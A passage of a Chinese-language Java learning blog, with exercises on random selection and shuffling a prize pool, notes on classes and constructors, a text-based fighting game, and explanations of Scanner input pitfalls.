	<span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(chs.length);</span><br><span class="line">			<span class="comment">// 利⽤随机索引，获取对应的元素</span></span><br><span class="line">			<span class="comment">// System.out.println(chs[randomIndex]);</span></span><br><span class="line">			result = result + chs[randomIndex];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// System.out.println(result);</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 3.随机抽取⼀个数字0~9</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> r.nextInt(<span class="number">10</span>);</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 拼接⽣成最终的结果</span></span><br><span class="line">		result = result + number;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 打印最终结果</span></span><br><span class="line">		System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="练习八：抽奖"><a class="header-anchor" href="#练习八：抽奖">¶</a>练习八：抽奖</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 解法一 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">/* 需求：</span></span><br><span class="line"><span class="comment">⼀个⼤V直播抽奖，奖品是现⾦红包，分别有&#123;2, 588 , 888, 1000, 10000&#125;五个奖⾦。</span></span><br><span class="line"><span class="comment">请使⽤代码模拟抽奖，打印出每个奖项，奖项的出现顺序要随机且不重复。</span></span><br><span class="line"><span class="comment">打印效果如下：（随机顺序，不⼀定是下⾯的顺序）</span></span><br><span class="line"><span class="comment">888元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">588元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">10000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">1000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">2元的奖⾦被抽出*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分析：</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 1.定义数组表⽰奖池</span></span><br><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">2</span>, <span class="number">588</span>, <span class="number">888</span>, <span class="number">1000</span>, <span class="number">10000</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 2.定义新数组⽤于存储抽奖的结果</span></span><br><span class="line"><span class="type">int</span>[] newArr = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 3.抽奖</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//因为有5个奖项，所以这⾥要循环5次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; ) &#123;</span><br><span class="line">    <span class="comment">//获取随机索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(arr.length);</span><br><span class="line">    <span class="comment">//获取奖项</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">prize</span> <span class="operator">=</span> arr[randomIndex];</span><br><span class="line">    <span class="comment">//判断当前的奖项是否存在，如果存在则重新抽取，如果不存在，就表⽰是有效奖项</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> contains(newArr, prize);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="comment">//把当前抽取到的奖项添加到newArr当中</span></span><br><span class="line">        newArr[i] = prize;</span><br><span class="line">        <span class="comment">//添加完毕之后，移动索引</span></span><br><span class="line">        i++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//4.遍历newArr</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; newArr.length; i++) &#123;</span><br><span class="line">	System.out.println(newArr[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 判断prize在数组当中是否存在</span></span><br><span class="line"><span class="comment">// 存在：true</span></span><br><span class="line"><span class="comment">// 不存在：false</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> prize)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[i] == prize)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 解法二 */</span></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 需求：</span></span><br><span class="line"><span class="comment">        ⼀个⼤V直播抽奖，奖品是现⾦红包，分别有&#123;2, 588 , 888, 1000, 10000&#125;五个奖⾦。</span></span><br><span class="line"><span class="comment">        请使⽤代码模拟抽奖，打印出每个奖项，奖项的出现顺序要随机且不重复。</span></span><br><span class="line"><span class="comment">        打印效果如下：（随机顺序，不⼀定是下⾯的顺序）</span></span><br><span class="line"><span class="comment">        888元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        588元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        10000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        1000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        2元的奖⾦被抽出*/</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1.把奖池内所有奖项的顺序打乱</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">2</span>, <span class="number">588</span>, <span class="number">888</span>, <span class="number">1000</span>, <span class="number">10000</span>&#125;;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i ++) &#123;</span><br><span class="line">            <span class="comment">// 获取随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(arr.length);</span><br><span class="line">            <span class="comment">// 拿着i与随机索引randomIndex上的值进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[randomIndex];</span><br><span class="line">            arr[randomIndex] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2.遍历奖池，从0索引开始获取每一个奖项</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i ++) &#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day8-面向对象"><a class="header-anchor" href="#Day8-面向对象">¶</a>Day8 面向对象</h2>
<h3 id="概念一些"><a class="header-anchor" href="#概念一些">¶</a>概念一些</h3>
<ul>
<li>类
<ul>
<li>类的理解
<ul>
<li>类是对现实⽣活中⼀类具有共同属性和⾏为的事物的抽象</li>
<li>类是对象的数据类型，类是具有相同属性和⾏为的⼀组对象的集合</li>
<li>简单理解：类就是对现实事物的⼀种描述</li>
</ul>
</li>
<li>类的组成
<ul>
<li>属性：指事物的特征，例如：⼿机事物（品牌，价格，尺⼨）</li>
<li>⾏为：指事物能执⾏的操作，例如：⼿机事物（打电话，发短信）</li>
</ul>
</li>
<li>类和对象的关系
<ul>
<li>类：类是对现实⽣活中⼀类具有共同属性和⾏为的事物的抽象</li>
<li>对象：是能够看得到摸的着的真实存在的实体</li>
<li>简单理解：<strong>类是对事物的⼀种描述，对象则为具体存在的事物</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="对象内存图"><a class="header-anchor" href="#对象内存图">¶</a>对象内存图</h3>
<ul>
<li><strong>总结</strong></li>
<li>多个对象在堆内存中，都有不同的内存划分，成员变量存储在各⾃的内存区域中，成员⽅法多个对象共⽤的⼀份</li>
<li>这个没太懂</li>
</ul>
<h3 id="封装"><a class="header-anchor" href="#封装">¶</a>封装</h3>
<ul>
<li>private修饰变量+getter&amp;setter方法</li>
</ul>
<h3 id="构造方法"><a class="header-anchor" href="#构造方法">¶</a>构造方法</h3>
<h4 id="标准类制作"><a class="header-anchor" href="#标准类制作">¶</a>标准类制作</h4>
<ol>
<li>
<p>类名需要⻅名知意</p>
</li>
<li>
<p>成员变量使⽤private修饰</p>
</li>
<li>
<p>提供⾄少两个构造⽅法</p>
<ol>
<li>⽆参构造⽅法</li>
<li>带全部参数的构造⽅法</li>
</ol>
</li>
<li>
<p>get和set⽅法</p>
<ul>
<li>提供每⼀个成员变量对应的setXxx()/getXxx()</li>
</ul>
</li>
<li>
<p>如果还有其他⾏为，也需要写上</p>
</li>
</ol>
<h2 id="Day9-面向对象综合训练"><a class="header-anchor" href="#Day9-面向对象综合训练">¶</a>Day9 面向对象综合训练</h2>
<h3 id="文字版格斗游戏"><a class="header-anchor" href="#文字版格斗游戏">¶</a>文字版格斗游戏</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 功能和人物信息等定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Role</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> blood;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> gender;</span><br><span class="line">    <span class="keyword">private</span> String face;<span class="comment">//长相是随机的</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    String[] boyfaces = &#123;<span class="string">&quot;风流俊雅&quot;</span>, <span class="string">&quot;气宇轩昂&quot;</span>, <span class="string">&quot;相貌英俊&quot;</span>, <span class="string">&quot;五官端正&quot;</span>, <span class="string">&quot;相貌平平&quot;</span>, <span class="string">&quot;一塌糊涂&quot;</span>, <span class="string">&quot;面目狰狞&quot;</span>&#125;;</span><br><span class="line">    String[] girlfaces = &#123;<span class="string">&quot;美奂绝伦&quot;</span>, <span class="string">&quot;沉鱼落雁&quot;</span>, <span class="string">&quot;婷婷玉立&quot;</span>, <span class="string">&quot;身材娇好&quot;</span>, <span class="string">&quot;相貌平平&quot;</span>, <span class="string">&quot;相貌简陋&quot;</span>, <span class="string">&quot;惨不忍睹&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//attack 攻击描述：</span></span><br><span class="line">    String[] attacks_desc = &#123;</span><br><span class="line">            <span class="string">&quot;%s使出了一招【背心钉】，转到对方的身后，一掌向%s背心的灵台穴拍去。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s使出了一招【游空探爪】，飞起身形自半空中变掌为抓锁向%s。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s大喝一声，身形下伏，一招【劈雷坠地】，捶向%s双腿。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s运气于掌，一瞬间掌心变得血红，一式【掌心雷】，推向%s。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s阴手翻起阳手跟进，一招【没遮拦】，结结实实的捶向%s。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s上步抢身，招中套招，一招【劈挂连环】，连环攻向%s。&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//injured 受伤描述：</span></span><br><span class="line">    String[] injureds_desc = &#123;</span><br><span class="line">            <span class="string">&quot;结果%s退了半步，毫发无损&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果给%s造成一处瘀伤&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果一击命中，%s痛得弯下腰&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s痛苦地闷哼了一声，显然受了点内伤&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s摇摇晃晃，一跤摔倒在地&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s脸色一下变得惨白，连退了好几步&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果『轰』的一声，%s口中鲜血狂喷而出&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s一声惨叫，像滩软泥般塌了下去&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Role</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Role</span><span class="params">(String name, <span class="type">int</span> blood, <span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.blood = blood;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">        <span class="comment">//随机长相</span></span><br><span class="line">        setFace(gender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(<span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFace</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> face;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFace</span><span class="params">(<span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="comment">//长相是随机的</span></span><br><span class="line">        <span class="keyword">if</span> (gender == <span class="string">&#x27;男&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//从boyfaces里面随机长相</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(boyfaces.length);</span><br><span class="line">            <span class="built_in">this</span>.face = boyfaces[index];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gender == <span class="string">&#x27;女&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//从girlfaces里面随机长相</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(girlfaces.length);</span><br><span class="line">            <span class="built_in">this</span>.face = girlfaces[index];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.face = <span class="string">&quot;面目狰狞&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBlood</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> blood;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBlood</span><span class="params">(<span class="type">int</span> blood)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blood = blood;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个方法用于攻击别人</span></span><br><span class="line">    <span class="comment">//思考：谁攻击谁？</span></span><br><span class="line">    <span class="comment">//Role r1 = new Role（）；</span></span><br><span class="line">    <span class="comment">//Role r2 = new Role（）；</span></span><br><span class="line">    <span class="comment">//r1.攻击(r2);</span></span><br><span class="line">    <span class="comment">//方法的调用者去攻击参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Role role)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(attacks_desc.length);</span><br><span class="line">        <span class="type">String</span> <span class="variable">KungFu</span> <span class="operator">=</span> attacks_desc[index];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输出一个攻击的效果</span></span><br><span class="line">        System.out.printf(KungFu, <span class="built_in">this</span>.getName(), role.getName());</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算造成的伤害 1 ~ 20</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hurt</span> <span class="operator">=</span> r.nextInt(<span class="number">20</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//剩余血量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">remainBoold</span> <span class="operator">=</span> role.getBlood() - hurt;</span><br><span class="line">        <span class="comment">//对剩余血量做一个验证，如果为负数了，就修改为0</span></span><br><span class="line">        remainBoold = remainBoold &lt; <span class="number">0</span> ? <span class="number">0</span> : remainBoold;</span><br><span class="line">        <span class="comment">//修改一下挨揍的人的血量</span></span><br><span class="line">        role.setBlood(remainBoold);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//受伤的描述</span></span><br><span class="line">        <span class="comment">//血量&gt; 90 0索引的描述</span></span><br><span class="line">        <span class="comment">//80 ~  90  1索引的描述</span></span><br><span class="line">        <span class="comment">//70 ~  80  2索引的描述</span></span><br><span class="line">        <span class="comment">//60 ~  70  3索引的描述</span></span><br><span class="line">        <span class="comment">//40 ~  60  4索引的描述</span></span><br><span class="line">        <span class="comment">//20 ~  40  5索引的描述</span></span><br><span class="line">        <span class="comment">//10 ~  20  6索引的描述</span></span><br><span class="line">        <span class="comment">//小于10的   7索引的描述</span></span><br><span class="line">        <span class="keyword">if</span> (remainBoold &gt; <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">0</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">80</span> &amp;&amp; remainBoold &lt;= <span class="number">90</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">1</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">70</span> &amp;&amp; remainBoold &lt;= <span class="number">80</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">2</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">60</span> &amp;&amp; remainBoold &lt;= <span class="number">70</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">3</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">40</span> &amp;&amp; remainBoold &lt;= <span class="number">60</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">4</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">20</span> &amp;&amp; remainBoold &lt;= <span class="number">40</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">5</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">10</span> &amp;&amp; remainBoold &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">6</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">7</span>], role.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showRoleInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名为：&quot;</span> + getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;血量为：&quot;</span> + getBlood());</span><br><span class="line">        System.out.println(<span class="string">&quot;性别为：&quot;</span> + getGender());</span><br><span class="line">        System.out.println(<span class="string">&quot;长相为：&quot;</span> + getFace());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 应用部分</span></span><br><span class="line"><span class="keyword">package</span> com.itheima.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建第一个角色</span></span><br><span class="line">        <span class="type">Role</span> <span class="variable">r1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="string">&quot;乔峰&quot;</span>,<span class="number">100</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">        <span class="comment">//2.创建第二个角色</span></span><br><span class="line">        <span class="type">Role</span> <span class="variable">r2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="string">&quot;鸠摩智&quot;</span>,<span class="number">100</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//展示一下角色的信息</span></span><br><span class="line">        r1.showRoleInfo();</span><br><span class="line">        r2.showRoleInfo();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.开始格斗 回合制游戏</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="comment">//r1开始攻击r2</span></span><br><span class="line">            r1.attack(r2);</span><br><span class="line">            <span class="comment">//判断r2的剩余血量</span></span><br><span class="line">            <span class="keyword">if</span>(r2.getBlood() == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(r1.getName() + <span class="string">&quot; K.O了&quot;</span> + r2.getName());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//r2开始攻击r1</span></span><br><span class="line">            r2.attack(r1);</span><br><span class="line">            <span class="keyword">if</span>(r1.getBlood() == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(r2.getName() + <span class="string">&quot; K.O了&quot;</span> + r1.getName());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>还有好几个有意思的，但是我懒了，后面实践有需要再看吧</li>
<li>这些实践例子在上部的P192及以前</li>
</ul>
<h2 id="扩展：键盘录入"><a class="header-anchor" href="#扩展：键盘录入">¶</a>扩展：键盘录入</h2>
<h3 id="涉及方法"><a class="header-anchor" href="#涉及方法">¶</a>涉及方法</h3>
<h4 id="next-nextLine"><a class="header-anchor" href="#next-nextLine">¶</a>next()  nextLine()</h4>
<ul>
<li>可以接受任意数据，但是都会返回⼀个字符串</li>
</ul>
<h4 id="nextInt"><a class="header-anchor" href="#nextInt">¶</a>nextInt()</h4>
<ul>
<li>只能接受整数</li>
</ul>
<h4 id="nextDouble"><a class="header-anchor" href="#nextDouble">¶</a>nextDouble()</h4>
<ul>
<li>能接收整数和⼩数，但是都会看做⼩数返回。录⼊字⺟会报错</li>
</ul>
<h3 id="方法底层细节"><a class="header-anchor" href="#方法底层细节">¶</a>方法底层细节</h3>
<h4 id="第⼀个细节"><a class="header-anchor" href="#第⼀个细节">¶</a>第⼀个细节</h4>
<ul>
<li>next（），nextInt（），nextDouble（）在接收数据的时候，会遇到空格，回⻋，制表符其中⼀个就会停⽌接收数据</li>
</ul>
<h4 id="第二个细节"><a class="header-anchor" href="#第二个细节">¶</a>第二个细节</h4>
<ul>
<li>next（），nextInt（），nextDouble（）在接收数据的时候，会遇到空格，回⻋，制表符其中⼀个就会停⽌接收数据。但是这些符号 + 后⾯的数据还在内存中并没有接收。</li>
<li>如果后⾯还有其他键盘录⼊的⽅法，会⾃动将这些数据接收</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> sc.next();</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> sc.next();</span><br><span class="line">System.out.println(s1);  <span class="comment">// a</span></span><br><span class="line">System.out.println(s2);  <span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//此时值键盘录入一次a b(注意a和b之间用空格隔开)</span></span><br><span class="line"><span class="comment">//那么第一个next();会接收a，a后面是空格，那么就停止，所以打印s1是a</span></span><br><span class="line"><span class="comment">//但是空格+b还在内存中。</span></span><br><span class="line"><span class="comment">//第二个next会去掉前面的空格，只接收b</span></span><br><span class="line"><span class="comment">//所以第二个s2打印出来是b</span></span><br></pre></td></tr></table></figure>
<h4 id="第三个细节"><a class="header-anchor" href="#第三个细节">¶</a>第三个细节</h4>
<ul>
<li>nextLine（）⽅法是把⼀整⾏全部接收完毕</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">System.out.println(s);  <span class="comment">// a b</span></span><br><span class="line"><span class="comment">//键盘录入a b(注意a和b之间用空格隔开)</span></span><br><span class="line"><span class="comment">//那么nextLine不会过滤前面和后面的空格，会把这一整行数据全部接收完毕。</span></span><br></pre></td></tr></table></figure>
<h3 id="混用引起的后果"><a class="header-anchor" href="#混用引起的后果">¶</a>混用引起的后果</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//①</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//②</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.nextLine();<span class="comment">//③</span></span><br><span class="line">System.out.println(i);<span class="comment">//④</span></span><br><span class="line">System.out.println(s);<span class="comment">//⑤</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当代码运⾏到第⼆⾏，会让我们键盘录⼊，此时录⼊123。但是实际上我们录的是123+回⻋</li>
<li>⽽nextInt是遇到空格，回⻋，制表符都会停⽌</li>
<li>所以nextInt只能接受123</li>
<li>回⻋还在内存中没有被接收。此时就被nextLine接收了</li>
<li>所以，如果混⽤就会导致nextLine接收不到数据</li>
<li>有时候就需要加一行nextLine()来吞回车</li>
</ul>
<h3 id="使用结论"><a class="header-anchor" href="#使用结论">¶</a>使用结论</h3>
<ul>
<li>
<p>键盘录⼊分为两套：</p>
<ul>
<li>next（）、nextInt（）、nextDouble（）这三个配套使⽤。</li>
<li>如果⽤了这三个其中⼀个，就不要⽤nextLine（）。</li>
</ul>
</li>
<li>
<p>nextLine（）单独使⽤。</p>
<ul>
<li>如果想要整数，那么先接收，再使⽤Integer.parseInt进⾏类型转换</li>
</ul>
</li>
